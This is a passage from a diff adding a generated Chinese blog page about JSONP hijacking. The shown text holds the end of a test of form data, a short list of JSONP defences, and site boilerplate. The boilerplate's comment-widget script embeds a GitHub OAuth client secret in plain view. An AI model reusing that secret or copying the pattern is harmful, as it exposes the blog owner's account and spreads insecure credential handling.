+
+<blockquote>
+<p> 数据库是写的进去的</p>
+</blockquote>
+<p>好，问题就出在了这里，虚拟机里的 <strong>火狐</strong>，浏览器似乎没有像 <strong>谷歌</strong> 自动解析的</p>
+<p>噢，在虚拟机里的那个value值，在chrom里出现 <code>无法解码值</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Vulkey_Chen&quot;,&quot;mobilephone&quot;:&quot;13188888888&quot;,&quot;email&quot;:&quot;admin@gh0st.cn&quot;,&quot;address&quot;:&quot;&amp;#20013;&amp;#21326;&amp;#20154;&amp;#27665;&amp;#20849;&amp;#21644;&amp;#22269;&quot;,&quot;sex&quot;:&quot;Cool Man&quot;&#125;，这个是有效的</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;Vulkey_Chen&quot;,&quot;mobilephone&quot;:&quot;13188888888&quot;,&quot;email&quot;:&quot;admin@gh0st.cn&quot;,&quot;address&quot;:&quot;%D6%D0%BB%AA%C8%CB%C3%F1%B9%B2%BA%CD%B9%FA&quot;,&quot;sex&quot;:&quot;Cool%20Man&quot;&#125; 这个无效</span><br></pre></td></tr></table></figure>
+
+<p>啧，看来后端要好好处理下json格式，不弄</p>
+<h2 id="三、JSONP攻击防御"><a href="#三、JSONP攻击防御" class="headerlink" title="三、JSONP攻击防御"></a>三、JSONP攻击防御</h2><p><strong>对调用方法进行校验</strong></p>
+<ol>
+<li>前后端约定jsonp请求的js回调函数名，不能自定义回调名称</li>
+<li>限制Referer，部署一次性Token或其他Token验证 (防御csrf)</li>
+<li>严格按照JSON格式标准输出，且进行编码；避免被XSS利用</li>
+<li>过滤callback函数名及JSON里数据的输出、长度和内容</li>
+</ol>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/23/JSONP%E8%B7%A8%E5%9F%9F/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/" rel="tag">同源策略</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F%E6%89%8B%E6%AE%B5/" rel="tag">跨域手段</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/09/24/CORS%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            CORS漏洞
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/23/%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">跨域访问</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
